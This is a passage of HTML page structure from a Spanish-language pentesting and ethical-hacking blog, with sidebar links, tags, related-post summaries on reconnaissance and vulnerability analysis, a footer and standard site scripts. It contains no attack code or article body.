pb-1 ml-1 mt-2"><li><a href="/posts/vulnerability-zerologon/">Zerologon Vulnerability Implementation</a><li><a href="/posts/TFG/">TFG - Sistema de control y administración de una red de garajes inteligentes y automatizados</a><li><a href="/posts/TFM/">Use of Natural Language Processing techniques for the automatic identification of TTPs in Threat Intelligence Reports.</a><li><a href="/posts/seg-ofensiva-introduccion/">Introducción al Hacking Ético y Penetration Testing</a><li><a href="/posts/seg-ofensiva-explotacion-vuln-red/">Explotación de vulnerabilidades en Red</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">Pentesting</a> <a class="post-tag" href="/tags/nmap/">NMAP</a> <a class="post-tag" href="/tags/archive-org/">Archive.org</a> <a class="post-tag" href="/tags/armitage/">Armitage</a> <a class="post-tag" href="/tags/arpspoofing/">ARPspoofing</a> <a class="post-tag" href="/tags/automatizaci%C3%B3n/">Automatización</a> <a class="post-tag" href="/tags/bettercap/">Bettercap</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/cpe/">CPE</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/seg-ofensiva-reco-activa/"><div class="card-body"> <em class="timeago small" date="2021-06-21 07:35:00 +0200" >Jun 21, 2021</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Recopilación Activa de información</h3><div class="text-muted small"><p> En esta sección se han recopilado algunas de las principales herramientas usadas durante la fase de recopilación activa de información. Antes de continuar… ¿Dónde entra el concepto d...</p></div></div></a></div><div class="card"> <a href="/posts/seg-ofensiva-analisis-vulnerabilidades/"><div class="card-body"> <em class="timeago small" date="2021-06-29 05:35:00 +0200" >Jun 29, 2021</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Análisis de vulnerabilidades</h3><div class="text-muted small"><p> Durante esta sección veremos las diferentes alternativas, tanto manuales como automáticas, de las que disponemos para realizar análisis de vulnerabilidades sobre un objetivo. Contenido Objetivo...</p></div></div></a></div><div class="card"> <a href="/posts/seg-ofensiva-reco-pasiva/"><div class="card-body"> <em class="timeago small" date="2021-05-25 12:03:00 +0200" >May 25, 2021</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Recopilación Pasiva de información</h3><div class="text-muted small"><p> En esta sección se han recopilado algunas de las principales herramientas usadas durante la fase de recopilación pasiva de información. Índice Objetivo Hacking con buscadores: Google Hacking ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/seg-ofensiva-analisis-vulnerabilidades/" class="btn btn-outline-primary" prompt="Older"><p>Análisis de vulnerabilidades</p></a> <a href="/posts/seg-ofensiva-explotacion-vuln-web/" class="btn btn-outline-primary" prompt="Newer"><p>Explotación de vulnerabilidades en Web</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://www.linkedin.com/in/javifs97">Javier Fernández Santos</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">Pentesting</a> <a class="post-tag" href="/tags/nmap/">NMAP</a> <a class="post-tag" href="/tags/archive-org/">Archive.org</a> <a class="post-tag" href="/tags/armitage/">Armitage</a> <a class="post-tag" href="/tags/arpspoofing/">ARPspoofing</a> <a class="post-tag" href="/tags/automatizaci%C3%B3n/">Automatización</a> <a class="post-tag" href="/tags/bettercap/">Bettercap</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/cpe/">CPE</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
